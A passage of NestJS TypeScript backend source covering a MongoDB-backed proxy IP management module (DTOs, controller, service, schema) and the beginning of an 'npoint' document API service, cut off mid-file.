  status?: string;\r\n\r\n    @ApiProperty({ example: 'client1', description: 'Client ID that owns this IP', required: false })\r\n    @IsOptional()\r\n    @IsString()\r\n    assignedToClient?: string;\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsString, IsOptional, IsEnum, IsNumber, IsBoolean } from 'class-validator';\r\n\r\nexport class SearchProxyIpDto {\r\n    @ApiProperty({ example: '192.168.1.100', description: 'IP address to search for', required: false })\r\n    @IsOptional()\r\n    @IsString()\r\n    ipAddress?: string;\r\n\r\n    @ApiProperty({ example: 8080, description: 'Port number to search for', required: false })\r\n    @IsOptional()\r\n    @IsNumber()\r\n    port?: number;\r\n\r\n    @ApiProperty({ example: 'http', description: 'Protocol type to search for', enum: ['http', 'https', 'socks5'], required: false })\r\n    @IsOptional()\r\n    @IsEnum(['http', 'https', 'socks5'])\r\n    protocol?: string;\r\n\r\n    @ApiProperty({ example: 'US', description: 'Country code to search for', required: false })\r\n    @IsOptional()\r\n    @IsString()\r\n    country?: string;\r\n\r\n    @ApiProperty({ example: 'active', description: 'Status to search for', enum: ['active', 'inactive', 'blocked', 'maintenance'], required: false })\r\n    @IsOptional()\r\n    @IsEnum(['active', 'inactive', 'blocked', 'maintenance'])\r\n    status?: string;\r\n\r\n    @ApiProperty({ example: true, description: 'Whether to search for assigned or unassigned IPs', required: false })\r\n    @IsOptional()\r\n    @IsBoolean()\r\n    isAssigned?: boolean;\r\n\r\n    @ApiProperty({ example: 'client1', description: 'Client ID to search for', required: false })\r\n    @IsOptional()\r\n    @IsString()\r\n    assignedToClient?: string;\r\n\r\n    @ApiProperty({ example: 'DataCenter', description: 'Provider to search for', required: false })\r\n    @IsOptional()\r\n    @IsString()\r\n    provider?: string;\r\n}\r\n\r\nexport class SearchIpMobileMappingDto {\r\n    @ApiProperty({ example: '916265240911', description: 'Mobile number to search for', required: false })\r\n    @IsOptional()\r\n    @IsString()\r\n    mobile?: string;\r\n\r\n    @ApiProperty({ example: '192.168.1.100:8080', description: 'IP address to search for', required: false })\r\n    @IsOptional()\r\n    @IsString()\r\n    ipAddress?: string;\r\n\r\n    @ApiProperty({ example: 'client1', description: 'Client ID to search for', required: false })\r\n    @IsOptional()\r\n    @IsString()\r\n    clientId?: string;\r\n\r\n    @ApiProperty({ example: 'active', description: 'Status to search for', enum: ['active', 'inactive'], required: false })\r\n    @IsOptional()\r\n    @IsEnum(['active', 'inactive'])\r\n    status?: string;\r\n}\r\n","import { PartialType } from '@nestjs/swagger';\r\nimport { CreateProxyIpDto } from './create-proxy-ip.dto';\r\n\r\nexport class UpdateProxyIpDto extends PartialType(CreateProxyIpDto) {}\r\n","export * from './ip-management.module';\r\nexport * from './ip-management.service';\r\nexport * from './ip-management.controller';\r\nexport * from './schemas/proxy-ip.schema';\r\nexport * from './dto/create-proxy-ip.dto';\r\nexport * from './dto/update-proxy-ip.dto';\r\nexport * from './dto/search-ip.dto';\r\n","import { Controller, Get, Post, Put, Delete, Body, Param, Query, HttpException, HttpStatus } from '@nestjs/common';\r\nimport {\r\n    ApiTags,\r\n    ApiOperation,\r\n    ApiResponse,\r\n    ApiParam,\r\n    ApiQuery,\r\n    ApiBody,\r\n    ApiOkResponse,\r\n    ApiBadRequestResponse,\r\n    ApiNotFoundResponse,\r\n    ApiConflictResponse\r\n} from '@nestjs/swagger';\r\nimport { IpManagementService } from './ip-management.service';\r\nimport { CreateProxyIpDto } from './dto/create-proxy-ip.dto';\r\nimport { UpdateProxyIpDto } from './dto/update-proxy-ip.dto';\r\nimport { SearchProxyIpDto, SearchIpMobileMappingDto } from './dto/search-ip.dto';\r\nimport { ProxyIp } from './schemas/proxy-ip.schema';\r\n\r\n@ApiTags('IP Management')\r\n@Controller('ip-management')\r\nexport class IpManagementController {\r\n    constructor(private readonly ipManagementService: IpManagementService) { }\r\n\r\n    // ==================== PROXY IP MANAGEMENT ====================\r\n\r\n    @Post('proxy-ips')\r\n    @ApiOperation({ summary: 'Create a new proxy IP' })\r\n    @ApiBody({ type: CreateProxyIpDto })\r\n    @ApiOkResponse({ description: 'Proxy IP created successfully', type: ProxyIp })\r\n    @ApiBadRequestResponse({ description: 'Invalid input data' })\r\n    @ApiConflictResponse({ description: 'Proxy IP already exists' })\r\n    async createProxyIp(@Body() createProxyIpDto: CreateProxyIpDto): Promise<ProxyIp> {\r\n        try {\r\n            return await this.ipManagementService.createProxyIp(createProxyIpDto);\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    @Post('proxy-ips/bulk')\r\n    @ApiOperation({ summary: 'Bulk create proxy IPs' })\r\n    @ApiBody({ type: [CreateProxyIpDto] })\r\n    @ApiOkResponse({ description: 'Bulk creation completed' })\r\n    async bulkCreateProxyIps(@Body() proxyIps: CreateProxyIpDto[]): Promise<{ created: number; failed: number; errors: string[] }> {\r\n        try {\r\n            return await this.ipManagementService.bulkCreateProxyIps(proxyIps);\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    @Get('proxy-ips')\r\n    @ApiOperation({ summary: 'Get all proxy IPs' })\r\n    @ApiOkResponse({ description: 'Proxy IPs retrieved successfully', type: [ProxyIp] })\r\n    async getAllProxyIps(): Promise<ProxyIp[]> {\r\n        try {\r\n            return await this.ipManagementService.findAllProxyIps();\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n        }\r\n    }\r\n\r\n    // Search functionality temporarily disabled for simplification\r\n    // @Get('proxy-ips/search')\r\n    // @ApiOperation({ summary: 'Search proxy IPs with filters' })\r\n    // @ApiQuery({ name: 'ipAddress', required: false, description: 'IP address to search for' })\r\n    // @ApiQuery({ name: 'port', required: false, description: 'Port number to search for' })\r\n    // @ApiQuery({ name: 'protocol', required: false, description: 'Protocol type', enum: ['http', 'https', 'socks5'] })\r\n    // @ApiQuery({ name: 'country', required: false, description: 'Country code' })\r\n    // @ApiQuery({ name: 'status', required: false, description: 'Status', enum: ['active', 'inactive', 'blocked', 'maintenance'] })\r\n    // @ApiQuery({ name: 'isAssigned', required: false, description: 'Assignment status' })\r\n    // @ApiQuery({ name: 'assignedToClient', required: false, description: 'Client ID' })\r\n    // @ApiQuery({ name: 'provider', required: false, description: 'Provider name' })\r\n    // @ApiOkResponse({ description: 'Search results', type: [ProxyIp] })\r\n    // async searchProxyIps(@Query() searchDto: SearchProxyIpDto): Promise<ProxyIp[]> {\r\n    //     try {\r\n    //         return await this.ipManagementService.searchProxyIps(searchDto);\r\n    //     } catch (error) {\r\n    //         throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    //     }\r\n    // }\r\n\r\n    // Get specific proxy IP functionality temporarily disabled for simplification\r\n    // @Get('proxy-ips/:ipAddress/:port')\r\n    // @ApiOperation({ summary: 'Get a specific proxy IP' })\r\n    // @ApiParam({ name: 'ipAddress', description: 'IP address' })\r\n    // @ApiParam({ name: 'port', description: 'Port number' })\r\n    // @ApiOkResponse({ description: 'Proxy IP found', type: ProxyIp })\r\n    // @ApiNotFoundResponse({ description: 'Proxy IP not found' })\r\n    // async getProxyIpById(@Param('ipAddress') ipAddress: string, @Param('port') port: string): Promise<ProxyIp> {\r\n    //     try {\r\n    //         return await this.ipManagementService.findProxyIpById(ipAddress, parseInt(port));\r\n    //     } catch (error) {\r\n    //         throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    //     }\r\n    // }\r\n\r\n    @Put('proxy-ips/:ipAddress/:port')\r\n    @ApiOperation({ summary: 'Update a proxy IP' })\r\n    @ApiParam({ name: 'ipAddress', description: 'IP address' })\r\n    @ApiParam({ name: 'port', description: 'Port number' })\r\n    @ApiBody({ type: UpdateProxyIpDto })\r\n    @ApiOkResponse({ description: 'Proxy IP updated successfully', type: ProxyIp })\r\n    @ApiNotFoundResponse({ description: 'Proxy IP not found' })\r\n    async updateProxyIp(\r\n        @Param('ipAddress') ipAddress: string,\r\n        @Param('port') port: string,\r\n        @Body() updateProxyIpDto: UpdateProxyIpDto\r\n    ): Promise<ProxyIp> {\r\n        try {\r\n            return await this.ipManagementService.updateProxyIp(ipAddress, parseInt(port), updateProxyIpDto);\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    @Delete('proxy-ips/:ipAddress/:port')\r\n    @ApiOperation({ summary: 'Delete a proxy IP' })\r\n    @ApiParam({ name: 'ipAddress', description: 'IP address' })\r\n    @ApiParam({ name: 'port', description: 'Port number' })\r\n    @ApiOkResponse({ description: 'Proxy IP deleted successfully' })\r\n    @ApiNotFoundResponse({ description: 'Proxy IP not found' })\r\n    @ApiBadRequestResponse({ description: 'Cannot delete assigned IP' })\r\n    async deleteProxyIp(@Param('ipAddress') ipAddress: string, @Param('port') port: string): Promise<{ message: string }> {\r\n        try {\r\n            await this.ipManagementService.deleteProxyIp(ipAddress, parseInt(port));\r\n            return { message: 'Proxy IP deleted successfully' };\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    // ==================== IP-MOBILE MAPPING MANAGEMENT ====================\r\n\r\n    // Get all mappings functionality temporarily disabled for simplification\r\n    // Use getClientMappings with specific clientId instead\r\n    // @Get('mappings')\r\n    // @ApiOperation({ summary: 'Get all IP-mobile mappings' })\r\n    // @ApiOkResponse({ description: 'Mappings retrieved successfully', type: [IpMobileMapping] })\r\n    // async getAllMappings(): Promise<IpMobileMapping[]> {\r\n    //     try {\r\n    //         // For simplified system, return all active mappings across all clients\r\n    //         const allMappings = await this.ipMobileMappingModel.find({ status: 'active' }).lean();\r\n    //         return allMappings;\r\n    //     } catch (error) {\r\n    //         throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n    //     }\r\n    // }\r\n\r\n    // Search functionality temporarily disabled for simplification\r\n    // @Get('mappings/search')\r\n    // @ApiOperation({ summary: 'Search IP-mobile mappings with filters' })\r\n    // @ApiQuery({ name: 'mobile', required: false, description: 'Mobile number to search for' })\r\n    // @ApiQuery({ name: 'ipAddress', required: false, description: 'IP address to search for' })\r\n    // @ApiQuery({ name: 'clientId', required: false, description: 'Client ID to search for' })\r\n    // @ApiQuery({ name: 'status', required: false, description: 'Status', enum: ['active', 'inactive'] })\r\n    // @ApiOkResponse({ description: 'Search results', type: [IpMobileMapping] })\r\n    // async searchMappings(@Query() searchDto: SearchIpMobileMappingDto): Promise<IpMobileMapping[]> {\r\n    //     try {\r\n    //         return await this.ipManagementService.searchMappings(searchDto);\r\n    //     } catch (error) {\r\n    //         throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    //     }\r\n    // }\r\n\r\n    // Create mapping functionality disabled for simplification - use assign endpoint instead\r\n    // @Post('mappings')\r\n    // @ApiOperation({ summary: 'Create a new IP-mobile mapping' })\r\n    // @ApiBody({ type: CreateIpMobileMappingDto })\r\n    // @ApiOkResponse({ description: 'Mapping created successfully', type: IpMobileMapping })\r\n    // @ApiBadRequestResponse({ description: 'Invalid input data' })\r\n    // async createMapping(@Body() createMappingDto: CreateIpMobileMappingDto): Promise<IpMobileMapping> {\r\n    //     try {\r\n    //         return await this.ipManagementService.createIpMobileMapping(createMappingDto);\r\n    //     } catch (error) {\r\n    //         throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    //     }\r\n    // }\r\n\r\n    @Get('health')\r\n    @ApiOperation({ summary: 'Get IP management health status' })\r\n    @ApiOkResponse({ description: 'Health status retrieved successfully' })\r\n    async getHealthStatus(): Promise<{\r\n        status: 'healthy' | 'warning' | 'critical';\r\n        availableIps: number;\r\n        totalActiveIps: number;\r\n        utilizationRate: number;\r\n        issues: string[];\r\n    }> {\r\n        try {\r\n            return await this.ipManagementService.healthCheck();\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n        }\r\n    }\r\n\r\n    @Get('proxy-ips/:ipAddress/:port')\r\n    @ApiOperation({ summary: 'Get a specific proxy IP' })\r\n    @ApiParam({ name: 'ipAddress', description: 'IP address' })\r\n    @ApiParam({ name: 'port', description: 'Port number' })\r\n    @ApiOkResponse({ description: 'Proxy IP found', type: ProxyIp })\r\n    @ApiNotFoundResponse({ description: 'Proxy IP not found' })\r\n    async getProxyIpById(@Param('ipAddress') ipAddress: string, @Param('port') port: string): Promise<ProxyIp> {\r\n        try {\r\n            return await this.ipManagementService.findProxyIpById(ipAddress, parseInt(port));\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n        }\r\n    }\r\n\r\n    @Get('clients/:clientId/assigned-ips')\r\n    @ApiOperation({ summary: 'Get all IPs assigned to a client' })\r\n    @ApiParam({ name: 'clientId', description: 'Client ID' })\r\n    @ApiOkResponse({ description: 'Client assigned IPs retrieved successfully', type: [ProxyIp] })\r\n    async getClientAssignedIps(@Param('clientId') clientId: string): Promise<ProxyIp[]> {\r\n        try {\r\n            return await this.ipManagementService.getClientAssignedIps(clientId);\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    @Get('available-count')\r\n    @ApiOperation({ summary: 'Get count of available IPs' })\r\n    @ApiOkResponse({ description: 'Available IP count retrieved successfully' })\r\n    async getAvailableIpCount(): Promise<{ count: number }> {\r\n        try {\r\n            const count = await this.ipManagementService.getAvailableIpCount();\r\n            return { count };\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n        }\r\n    }\r\n\r\n    // Cleanup functionality temporarily disabled for simplification\r\n    // @Post('maintenance/cleanup-expired')\r\n    // @ApiOperation({ summary: 'Clean up expired IP mappings' })\r\n    // @ApiOkResponse({ description: 'Cleanup completed' })\r\n    // async cleanupExpiredMappings(): Promise<{ message: string; cleanedCount: number }> {\r\n    //     try {\r\n    //         const cleanedCount = await this.ipManagementService.cleanupExpiredMappings();\r\n    //         return { message: 'Cleanup completed', cleanedCount };\r\n    //     } catch (error) {\r\n    //         throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n    //     }\r\n    // }\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { IpManagementController } from './ip-management.controller';\r\nimport { IpManagementService } from './ip-management.service';\r\nimport { ProxyIp, ProxyIpSchema } from './schemas/proxy-ip.schema';\r\nimport { ClientModule } from '../clients/client.module';\r\nimport { PromoteClientModule } from '../promote-clients/promote-client.module';\r\n\r\n@Module({\r\n    imports: [\r\n        MongooseModule.forFeature([\r\n            { name: ProxyIp.name, schema: ProxyIpSchema },\r\n        ]),\r\n        forwardRef(() => ClientModule),\r\n        forwardRef(() => PromoteClientModule)\r\n    ],\r\n    controllers: [IpManagementController],\r\n    providers: [IpManagementService],\r\n    exports: [IpManagementService]\r\n})\r\nexport class IpManagementModule { }\r\n","import { Injectable, NotFoundException, BadRequestException, ConflictException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { ProxyIp, ProxyIpDocument } from './schemas/proxy-ip.schema';\r\nimport { CreateProxyIpDto } from './dto/create-proxy-ip.dto';\r\nimport { UpdateProxyIpDto } from './dto/update-proxy-ip.dto';\r\nimport { Logger } from '../../utils';\r\n\r\n@Injectable()\r\nexport class IpManagementService {\r\n    private readonly logger = new Logger(IpManagementService.name);\r\n\r\n    constructor(\r\n        @InjectModel(ProxyIp.name) private proxyIpModel: Model<ProxyIpDocument>,\r\n    ) {}\r\n\r\n    // ==================== PROXY IP MANAGEMENT ====================\r\n\r\n    async createProxyIp(createProxyIpDto: CreateProxyIpDto): Promise<ProxyIp> {\r\n        // Input validation\r\n        if (!createProxyIpDto.ipAddress || !createProxyIpDto.port) {\r\n            throw new BadRequestException('IP address and port are required');\r\n        }\r\n\r\n        if (createProxyIpDto.port < 1 || createProxyIpDto.port > 65535) {\r\n            throw new BadRequestException('Port must be between 1 and 65535');\r\n        }\r\n\r\n        this.logger.debug(`Creating new proxy IP: ${createProxyIpDto.ipAddress}:${createProxyIpDto.port}`);\r\n\r\n        try {\r\n            // Check if IP:Port combination already exists\r\n            const existingIp = await this.proxyIpModel.findOne({\r\n                ipAddress: createProxyIpDto.ipAddress,\r\n                port: createProxyIpDto.port\r\n            });\r\n\r\n            if (existingIp) {\r\n                throw new ConflictException(`Proxy IP ${createProxyIpDto.ipAddress}:${createProxyIpDto.port} already exists`);\r\n            }\r\n\r\n            const createdIp = new this.proxyIpModel(createProxyIpDto);\r\n            const savedIp = await createdIp.save();\r\n\r\n            this.logger.log(`Created proxy IP: ${savedIp.ipAddress}:${savedIp.port}`);\r\n            return savedIp.toJSON();\r\n        } catch (error) {\r\n            if (error instanceof ConflictException || error instanceof BadRequestException) {\r\n                throw error;\r\n            }\r\n            this.logger.error(`Failed to create proxy IP ${createProxyIpDto.ipAddress}:${createProxyIpDto.port}: ${error.message}`);\r\n            throw new BadRequestException(`Failed to create proxy IP: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    async bulkCreateProxyIps(proxyIps: CreateProxyIpDto[]): Promise<{ created: number; failed: number; errors: string[] }> {\r\n        if (!proxyIps || proxyIps.length === 0) {\r\n            throw new BadRequestException('No proxy IPs provided for bulk creation');\r\n        }\r\n\r\n        this.logger.debug(`Bulk creating ${proxyIps.length} proxy IPs`);\r\n\r\n        let created = 0;\r\n        let failed = 0;\r\n        const errors: string[] = [];\r\n\r\n        // Process in batches to avoid overwhelming the database\r\n        const batchSize = 10;\r\n        for (let i = 0; i < proxyIps.length; i += batchSize) {\r\n            const batch = proxyIps.slice(i, i + batchSize);\r\n            \r\n            for (const ipDto of batch) {\r\n                try {\r\n                    // Validate each IP before creating\r\n                    if (!ipDto.ipAddress || !ipDto.port) {\r\n                        failed++;\r\n                        errors.push(`Invalid IP data: missing address or port`);\r\n                        continue;\r\n                    }\r\n\r\n                    await this.createProxyIp(ipDto);\r\n                    created++;\r\n                } catch (error) {\r\n                    failed++;\r\n                    errors.push(`${ipDto.ipAddress}:${ipDto.port} - ${error.message}`);\r\n                }\r\n            }\r\n        }\r\n\r\n        this.logger.log(`Bulk creation completed: ${created} created, ${failed} failed`);\r\n        return { created, failed, errors };\r\n    }\r\n\r\n    async findAllProxyIps(): Promise<ProxyIp[]> {\r\n        return this.proxyIpModel.find().lean();\r\n    }\r\n\r\n    async getAvailableProxyIps(): Promise<ProxyIp[]> {\r\n        return this.proxyIpModel.find({\r\n            status: 'active',\r\n            isAssigned: false\r\n        }).lean();\r\n    }\r\n\r\n    async updateProxyIp(ipAddress: string, port: number, updateDto: UpdateProxyIpDto): Promise<ProxyIp> {\r\n        this.logger.debug(`Updating proxy IP: ${ipAddress}:${port}`);\r\n\r\n        const updatedIp = await this.proxyIpModel.findOneAndUpdate(\r\n            { ipAddress, port },\r\n            { $set: updateDto },\r\n            { new: true }\r\n        ).lean();\r\n\r\n        if (!updatedIp) {\r\n            throw new NotFoundException(`Proxy IP ${ipAddress}:${port} not found`);\r\n        }\r\n\r\n        this.logger.log(`Updated proxy IP: ${ipAddress}:${port}`);\r\n        return updatedIp;\r\n    }\r\n\r\n    async deleteProxyIp(ipAddress: string, port: number): Promise<void> {\r\n        this.logger.debug(`Deleting proxy IP: ${ipAddress}:${port}`);\r\n\r\n        const result = await this.proxyIpModel.deleteOne({ ipAddress, port });\r\n        if (result.deletedCount === 0) {\r\n            throw new NotFoundException(`Proxy IP ${ipAddress}:${port} not found`);\r\n        }\r\n\r\n        this.logger.log(`Deleted proxy IP: ${ipAddress}:${port}`);\r\n    }\r\n\r\n\r\n    async getStats(): Promise<{\r\n        total: number;\r\n        available: number;\r\n        assigned: number;\r\n        inactive: number;\r\n    }> {\r\n        try {\r\n            const [total, available, assigned, inactive] = await Promise.all([\r\n                this.proxyIpModel.countDocuments(),\r\n                this.proxyIpModel.countDocuments({ status: 'active', isAssigned: false }),\r\n                this.proxyIpModel.countDocuments({ isAssigned: true }),\r\n                this.proxyIpModel.countDocuments({ status: 'inactive' })\r\n            ]);\r\n\r\n            return { \r\n                total, \r\n                available, \r\n                assigned, \r\n                inactive\r\n            };\r\n        } catch (error) {\r\n            this.logger.error(`Error getting statistics: ${error.message}`);\r\n            throw new BadRequestException(`Failed to get statistics: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    // ==================== ADDITIONAL UTILITY METHODS ====================\r\n\r\n    /**\r\n     * Get specific proxy IP by address and port\r\n     */\r\n    async findProxyIpById(ipAddress: string, port: number): Promise<ProxyIp> {\r\n        if (!ipAddress || !port) {\r\n            throw new BadRequestException('IP address and port are required');\r\n        }\r\n\r\n        try {\r\n            const proxyIp = await this.proxyIpModel.findOne({ ipAddress, port }).lean();\r\n            if (!proxyIp) {\r\n                throw new NotFoundException(`Proxy IP ${ipAddress}:${port} not found`);\r\n            }\r\n            return proxyIp;\r\n        } catch (error) {\r\n            if (error instanceof NotFoundException) {\r\n                throw error;\r\n            }\r\n            this.logger.error(`Error finding proxy IP ${ipAddress}:${port}: ${error.message}`);\r\n            throw new BadRequestException(`Failed to find proxy IP: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Get all IPs assigned to a specific client\r\n     */\r\n    async getClientAssignedIps(clientId: string): Promise<ProxyIp[]> {\r\n        if (!clientId || clientId.trim() === '') {\r\n            throw new BadRequestException('Client ID is required');\r\n        }\r\n\r\n        try {\r\n            return this.proxyIpModel.find({\r\n                assignedToClient: clientId.trim(),\r\n                isAssigned: true\r\n            }).lean();\r\n        } catch (error) {\r\n            this.logger.error(`Error getting assigned IPs for client ${clientId}: ${error.message}`);\r\n            throw new BadRequestException(`Failed to get assigned IPs: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Check if an IP is available for assignment\r\n     */\r\n    async isIpAvailable(ipAddress: string, port: number): Promise<boolean> {\r\n        if (!ipAddress || !port) {\r\n            throw new BadRequestException('IP address and port are required');\r\n        }\r\n\r\n        try {\r\n            const ip = await this.proxyIpModel.findOne({\r\n                ipAddress,\r\n                port,\r\n                status: 'active',\r\n                isAssigned: false\r\n            }).lean();\r\n\r\n            return ip !== null;\r\n        } catch (error) {\r\n            this.logger.error(`Error checking IP availability ${ipAddress}:${port}: ${error.message}`);\r\n            return false;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Get available IP count\r\n     */\r\n    async getAvailableIpCount(): Promise<number> {\r\n        try {\r\n            return this.proxyIpModel.countDocuments({\r\n                status: 'active',\r\n                isAssigned: false\r\n            });\r\n        } catch (error) {\r\n            this.logger.error(`Error getting available IP count: ${error.message}`);\r\n            return 0;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Health check method to validate IP pool status\r\n     */\r\n    async healthCheck(): Promise<{\r\n        status: 'healthy' | 'warning' | 'critical';\r\n        availableIps: number;\r\n        totalActiveIps: number;\r\n        utilizationRate: number;\r\n        issues: string[];\r\n    }> {\r\n        try {\r\n            const stats = await this.getStats();\r\n            const issues: string[] = [];\r\n            \r\n            const utilizationRate = stats.total > 0 ? (stats.assigned / stats.total) * 100 : 0;\r\n\r\n            let status: 'healthy' | 'warning' | 'critical' = 'healthy';\r\n\r\n            if (stats.available === 0) {\r\n                status = 'critical';\r\n                issues.push('No available IPs in pool');\r\n            } else if (stats.available < 5) {\r\n                status = 'warning';\r\n                issues.push('Low IP availability (less than 5 IPs available)');\r\n            }\r\n\r\n            if (utilizationRate > 90) {\r\n                status = utilizationRate > 95 ? 'critical' : 'warning';\r\n                issues.push(`High utilization rate: ${utilizationRate.toFixed(1)}%`);\r\n            }\r\n\r\n            if (stats.inactive > stats.total * 0.2) {\r\n                status = 'warning';\r\n                issues.push('High number of inactive IPs');\r\n            }\r\n\r\n            return {\r\n                status,\r\n                availableIps: stats.available,\r\n                totalActiveIps: stats.total - stats.inactive,\r\n                utilizationRate: parseFloat(utilizationRate.toFixed(1)),\r\n                issues\r\n            };\r\n        } catch (error) {\r\n            this.logger.error(`Error during health check: ${error.message}`);\r\n            return {\r\n                status: 'critical',\r\n                availableIps: 0,\r\n                totalActiveIps: 0,\r\n                utilizationRate: 0,\r\n                issues: ['Health check failed']\r\n            };\r\n        }\r\n    }\r\n}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Document } from 'mongoose';\r\n\r\nexport type ProxyIpDocument = ProxyIp & Document;\r\n\r\n@Schema({\r\n    collection: 'proxy_ips',\r\n    versionKey: false,\r\n    autoIndex: true,\r\n    timestamps: true,\r\n    toJSON: {\r\n        virtuals: true,\r\n        transform: (doc, ret) => {\r\n            delete ret._id;\r\n        },\r\n    },\r\n})\r\nexport class ProxyIp {\r\n    @ApiProperty({ example: '192.168.1.100', description: 'IP address of the proxy' })\r\n    @Prop({ required: true, unique: true })\r\n    ipAddress: string;\r\n\r\n    @ApiProperty({ example: 8080, description: 'Port number of the proxy' })\r\n    @Prop({ required: true })\r\n    port: number;\r\n\r\n    @ApiProperty({ example: 'http', description: 'Protocol type (http, https, socks5)', enum: ['http', 'https', 'socks5'] })\r\n    @Prop({ required: true, enum: ['http', 'https', 'socks5'] })\r\n    protocol: string;\r\n\r\n    @ApiProperty({ example: 'username', description: 'Username for proxy authentication' })\r\n    @Prop({ required: false })\r\n    username?: string;\r\n\r\n    @ApiProperty({ example: 'password', description: 'Password for proxy authentication' })\r\n    @Prop({ required: false })\r\n    password?: string;\r\n\r\n    @ApiProperty({ example: 'active', description: 'Status of the proxy IP', enum: ['active', 'inactive'] })\r\n    @Prop({ required: true, default: 'active', enum: ['active', 'inactive'] })\r\n    status: string;\r\n\r\n    @ApiProperty({ example: false, description: 'Whether this IP is currently assigned to a mobile number' })\r\n    @Prop({ required: true, default: false })\r\n    isAssigned: boolean;\r\n\r\n    @ApiProperty({ example: 'client1', description: 'Client ID that owns this IP' })\r\n    @Prop({ required: false })\r\n    assignedToClient?: string;\r\n}\r\n\r\nexport const ProxyIpSchema = SchemaFactory.createForClass(ProxyIp);\r\n\r\n// Create indexes for better performance\r\nProxyIpSchema.index({ ipAddress: 1, port: 1 }, { unique: true });\r\nProxyIpSchema.index({ status: 1, isAssigned: 1 });\r\nProxyIpSchema.index({ assignedToClient: 1 });\r\n","export * from './npoint.controller';\nexport * from './npoint.module';\nexport * from './npoint.service';\n","import {\n    Controller,\n    Get,\n    Post,\n    Put,\n    Param,\n    Body,\n    HttpException,\n    HttpStatus,\n  } from '@nestjs/common';\n  import { NpointService } from './npoint.service';\n  import {\n    ApiTags,\n    ApiOperation,\n    ApiParam,\n    ApiBody,\n    ApiResponse,\n  } from '@nestjs/swagger';\n  \n  @ApiTags('NPoint API') // Group endpoints under \"NPoint API\" in Swagger UI\n  @Controller('npoint')\n  export class NpointController {\n    constructor(private readonly npointService: NpointService) {}\n  \n    @Get('documents/:id')\n    @ApiOperation({ summary: 'Fetch a document by ID' }) // Description of the endpoint\n    @ApiParam({ name: 'id', description: 'The ID of the document to fetch' }) // Document the parameter\n    @ApiResponse({\n      status: 200,\n      description: 'Document fetched successfully',\n    })\n    @ApiResponse({ status: 404, description: 'Document not found' })\n    async fetchDocument(@Param('id') id: string) {\n      try {\n        return await this.npointService.fetchDocument(id);\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.NOT_FOUND);\n      }\n    }\n  \n    @Post('documents')\n    @ApiOperation({ summary: 'Post a new document' })\n    @ApiBody({\n      description: 'The document to post',\n      schema: {\n        example: {\n          title: 'My Document',\n          content: 'This is the content of the document.',\n        },\n      },\n    })\n    @ApiResponse({\n      status: 201,\n      description: 'Document posted successfully',\n    })\n    @ApiResponse({ status: 400, description: 'Invalid input' })\n    async postDocument(@Body() document: any) {\n      try {\n        return await this.npointService.postDocument(document);\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\n      }\n    }\n\n    @Get('documents')\n    @ApiOperation({ summary: 'Fetch all documents' })\n    @ApiResponse({\n      status: 200,\n      description: 'List of all documents fetched successfully',\n    })\n    @ApiResponse({ status: 500, description: 'Internal server error' })\n    async fetchAllDocuments() {\n      try {\n        return await this.npointService.fetchAllDocuments();\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\n      }\n    }  \n  \n    @Put('documents/:id')\n    @ApiOperation({ summary: 'Update a document by ID' })\n    @ApiParam({ name: 'id', description: 'The ID of the document to update' })\n    @ApiBody({\n      description: 'The updated document',\n      schema: {\n        example: {\n          title: 'Updated Document',\n          content: 'This is the updated content of the document.',\n        },\n      },\n    })\n    @ApiResponse({\n      status: 200,\n      description: 'Document updated successfully',\n    })\n    @ApiResponse({ status: 404, description: 'Document not found' })\n    async updateDocument(@Param('id') id: string, @Body() updatedDocument: any) {\n      try {\n        return await this.npointService.updateDocument(id, updatedDocument);\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.NOT_FOUND);\n      }\n    }\n  }","import { Module } from '@nestjs/common';\nimport { NpointService } from './npoint.service';\nimport { NpointController } from './npoint.controller';\nimport { InitModule } from '../ConfigurationInit';\n\n@Module({\n  imports: [\n    InitModule,\n  ],\n  controllers: [NpointController],\n  providers: [NpointService],\n  exports: [NpointService]\n})\nexport class NpointModule {}","import { Injectable } from '@nestjs/common';\nimport axios from 'axios';\nimport { Logger } from '../../utils';\n\n@Injectable()\nexport class NpointService {\n    private readonly logger = new Logger(NpointService.name);\n    private csrfToken: string | null = null;\n    private cookie: string | null = 